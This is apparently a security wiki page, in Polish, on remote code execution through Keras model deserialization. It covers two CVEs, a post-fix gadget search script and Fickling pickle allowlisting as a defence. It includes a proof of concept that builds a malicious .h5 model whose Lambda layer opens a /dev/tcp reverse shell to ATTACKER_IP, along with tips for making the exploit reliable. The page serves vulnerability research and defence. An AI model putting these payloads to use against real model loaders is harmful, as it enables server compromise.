# Keras Model Deserialization RCE i wyszukiwanie gadżetów

Ta strona podsumowuje praktyczne techniki exploitation wymierzone w pipeline deserializacji modeli Keras, wyjaśnia wewnętrzne elementy natywnego formatu .keras i attack surface oraz udostępnia researcher toolkit do wyszukiwania Model File Vulnerabilities (MFVs) i post-fix gadgets.

## Wewnętrzne elementy formatu modelu .keras

Plik .keras jest archiwum ZIP zawierającym co najmniej:<sup>[[1]](#references)</sup>
- metadata.json – ogólne informacje (np. wersja Keras)
- config.json – architektura modelu (primary attack surface)
- model.weights.h5 – wagi w formacie HDF5

config.json steruje rekursywną deserializacją: Keras importuje moduły, rozpoznaje klasy/funkcje i odtwarza warstwy/obiekty ze słowników kontrolowanych przez attackera.<sup>[[1]](#references)</sup>

Przykładowy fragment dla obiektu warstwy Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization wykonuje:<sup>[[1]](#references)</sup>
- Import modułu i rozwiązywanie symboli na podstawie kluczy module/class_name
- Wywołanie from_config(...) lub konstruktora z kontrolowanymi przez attackera kwargs
- Rekurencję do zagnieżdżonych obiektów (activations, initializers, constraints itd.)

Historycznie umożliwiało to attackerowi tworzącemu config.json wykorzystanie trzech prymitywów:<sup>[[1]](#references)</sup>
- Kontrolę nad importowanymi modułami
- Kontrolę nad rozwiązywanymi klasami/funkcjami
- Kontrolę nad kwargs przekazywanymi do konstruktorów/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Główna przyczyna:
- Legacy Lambda deserialization rekonstruowała funkcję Python z kontrolowanego przez attackera marshaled code: `func_load()` dekoduje payload z base64, wywołuje `marshal.loads()` i tworzy `FunctionType`. Bytecode wynikowej funkcji jest wykonywany podczas wywołania Lambda, a loadery sprzed wersji 2.13, których dotyczy problem, nie wymuszały safe-mode checks dla legacy formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

W natywnym archiwum Keras v3 funkcja Lambda jest reprezentowana jako obiekt `__lambda__`, którego pole `code` zawiera zakodowany w base64 marshaled code:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigacja:
- Keras domyślnie wymusza `safe_mode=True` dla natywnego formatu Keras v3. Serializowane lambdy Python w `Lambda` są blokowane, chyba że użytkownik jawnie wyłączy tę ochronę za pomocą `safe_mode=False`; ta ochrona nie obejmuje starszych formatów w taki sam sposób.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Uwagi:
- Starsze formaty (starsze zapisy HDF5) lub starsze codebase’y mogą nie wymuszać nowoczesnych kontroli, dlatego ataki typu „downgrade” nadal mogą mieć zastosowanie, gdy ofiary korzystają ze starszych loaderów.

## CVE-2025-1550 – Import dowolnego modułu w Keras 3.0.0–3.8.x

Główna przyczyna:
- `_retrieve_class_or_fn` używał `importlib.import_module(module)` na kontrolowanych przez atakującego ciągach modułów z `config.json`.
- Wpływ: Spreparowane archiwum `.keras` mogło spowodować, że `Model.load_model()` zaimportuje wybrane przez atakującego moduły i funkcje Python, wywołując skutki uboczne podczas importu oraz przekazując argumenty kontrolowane przez atakującego, nawet przy `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Pomysł na exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Ulepszenia bezpieczeństwa (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist modułów: importy ograniczone do oficjalnych modułów ekosystemu: keras, keras_hub, keras_cv, keras_nlp
- Domyślny safe mode: safe_mode=True blokuje ładowanie niebezpiecznych serializowanych funkcji Lambda
- Podstawowe sprawdzanie typów: deserializowane obiekty muszą odpowiadać oczekiwanym typom

## Praktyczne wykorzystanie: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Starsze wdrożenia TensorFlow-Keras mogą nadal akceptować pliki modeli HDF5 (`.h5`). Jeśli attacker może przesłać model, który serwer później załaduje lub na którym wykona inference, podatny loader może deserializować warstwę Lambda zawierającą kod Python kontrolowany przez attackera, który następnie może zostać wykonany w ramach workflow modelu aplikacji.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimalny PoC tworzący złośliwy plik .h5, którego Lambda wykonuje reverse shell, gdy target wywoła model:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Uwagi i wskazówki dotyczące niezawodności:
- Punkty wyzwalania różnią się w zależności od formatu i workflow; w przywołanym opracowaniu payload wykonał się dwukrotnie podczas predykcji. Traktuj efekty uboczne jako powtarzalne i twórz payloady idempotentne.<sup>[[7]](#references)</sup>
- Przypinanie wersji: dopasuj TF/Keras/Python do środowiska ofiary, aby uniknąć niezgodności serializacji. Na przykład twórz artefakty w Pythonie 3.8 z TensorFlow 2.13.1, jeśli właśnie tego używa cel.<sup>[[7]](#references)</sup>
- Szybka replikacja środowiska:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Weryfikacja: nieszkodliwy payload, taki jak `os.system("ping -c 1 YOUR_IP")`, pomaga potwierdzić wykonanie (np. obserwując ICMP za pomocą tcpdump) przed przejściem do reverse shell.<sup>[[7]](#references)</sup>

## Powierzchnia gadgetów po naprawie wewnątrz allowlist

Nawet przy allowlist modułu Keras i safe mode dozwolone callable mogą ujawniać skutki uboczne. Na przykład `keras.utils.get_file` pobiera URL i zapisuje go w skonfigurowanej lokalizacji cache, co czyni tę funkcję kandydatem do analizy gadgetów.<sup>[[1]](#references)[[19]](#references)</sup>

Przykładowa konfiguracja Lambda (zweryfikuj sygnaturę wywołania w kontrolowanym teście):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Ważne ograniczenie:
- `Lambda.call()` zawsze przekazuje input modelu jako pierwszy argument pozycyjny, a skonfigurowane `arguments` jako argumenty nazwane. W przypadku `get_file` ta wartość pozycyjna wypełnia `fname`; niezgodność typu tensor/ścieżka może spowodować niepowodzenie tego kandydata przed rozpoczęciem pobierania, więc nie jest to gwarantowanie działający gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting importów pickle dla modeli AI/ML (Fickling)

Wiele formatów modeli AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artefakty joblib/scikit-learn oraz inne natywne formaty Python) osadza dane Python pickle. Opisana powyżej starsza ścieżka Keras Lambda używa zamiast tego marshaled function bytecode, dlatego stanowi odrębne ryzyko deserializacji. Opcode pickle mogą wywoływać zachowanie kontrolowane przez atakującego podczas deserializacji, w tym manipulowanie modelem lub RCE, a proste skanery mogą nie wykrywać nowych albo nieumieszczonych na liście niebezpiecznych importów.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Praktyczną obroną typu fail-closed jest podpięcie się do deserializera pickle języka Python i zezwalanie podczas unpicklingu wyłącznie na sprawdzony zestaw nieszkodliwych importów związanych z ML. Fickling firmy Trail of Bits implementuje tę politykę i zawiera starannie dobraną allowlistę importów ML utworzoną na podstawie tysięcy publicznych pickle z Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Model bezpieczeństwa dla „bezpiecznych” importów (intuicje wyprowadzone z badań i praktyki): importowane symbole używane przez pickle muszą jednocześnie:<sup>[[8]](#references)</sup>
- Nie wykonywać kodu ani nie powodować jego wykonania (bez skompilowanych/źródłowych obiektów kodu, uruchamiania poleceń powłoki, hooków itd.)
- Nie pobierać ani nie ustawiać dowolnych atrybutów lub elementów
- Nie importować ani nie uzyskiwać referencji do innych obiektów Python z maszyny wirtualnej pickle
- Nie uruchamiać żadnych wtórnych deserializerów (np. marshal, zagnieżdżonego pickle), nawet pośrednio

Włącz ochronę Ficklinga możliwie wcześnie podczas uruchamiania procesu, aby każde ładowanie pickle wykonywane przez frameworki (`torch.load`, `joblib.load` itd.) było sprawdzane:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Wskazówki operacyjne:
- Możesz tymczasowo wyłączać i ponownie włączać hooks w razie potrzeby:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Jeśli sprawdzony model jest blokowany, po przejrzeniu symboli rozszerz allowlist dla swojego środowiska:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling udostępnia również ogólne runtime guards, jeśli preferujesz bardziej granularną kontrolę:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() wymusza sprawdzanie dla wszystkich pickle.load()
- with fickling.check_safety(): zapewnia wymuszanie w określonym zakresie
- fickling.load(path) / fickling.is_likely_safe(path) do jednorazowych kontroli

- Jeśli to możliwe, preferuj formaty modeli inne niż pickle (np. SafeTensors).<sup>[[15]](#references)</sup> Jeśli musisz akceptować pickle, uruchamiaj loadery z minimalnymi uprawnieniami, bez network egress, i wymuszaj allowlist.

Ta strategia allowlist-first skutecznie blokuje typowe ścieżki exploitów ML pickle, zachowując jednocześnie wysoką kompatybilność. W benchmarku ToB Fickling wykrył 100% syntetycznych złośliwych plików i dopuścił ~99% czystych plików z najpopularniejszych repozytoriów Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Narzędzia badacza

1) Systematyczne wykrywanie gadgetów w dozwolonych modułach

Wylicz potencjalne callables w keras, keras_nlp, keras_cv, keras_hub i nadaj priorytet tym, które powodują efekty uboczne związane z plikami, network, procesami lub środowiskiem.<sup>[[1]](#references)</sup>

<details>
<summary>Wylicz potencjalnie niebezpieczne callables w allowlisted modułach Keras</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Bezpośrednie testowanie deserializacji (archiwum .keras nie jest potrzebne)

Przekazuj spreparowane słowniki bezpośrednio do deserializatorów Keras, aby poznać akceptowane parametry i obserwować efekty uboczne.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Sondowanie między wersjami i formatami

Keras występuje w wielu codebase'ach/erach, z różnymi zabezpieczeniami i formatami:<sup>[[1]](#references)</sup>
- Wbudowany Keras TensorFlow: tensorflow/python/keras (legacy, przeznaczony do usunięcia)
- tf-keras: utrzymywany oddzielnie
- Multi-backend Keras 3 (official): wprowadzono natywny format .keras

Powtórz testy w różnych codebase'ach i formatach (.keras oraz legacy HDF5), aby wykryć regresje lub brakujące zabezpieczenia.

## References

- [1] [Wyszukiwanie podatności w deserializacji modeli Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Dodano kontrole do serializacji](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE podczas deserializacji Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Arbitrary module import w Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [raport huntr – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [raport huntr – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – Lambda RCE do root w TensorFlow .h5](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [blog Trail of Bits – nowy skaner plików pickle AI/ML projektu Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – zabezpieczanie środowisk AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Korpus benchmarków skanowania pickle Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Materiały na temat ataków Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projekt SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Warstwy Lambda Keras 2 umożliwiają arbitrary code injection](https://kb.cert.org/vuls/id/253266)
- [17] [Kod źródłowy warstwy Lambda Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Kod źródłowy narzędzi Python Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
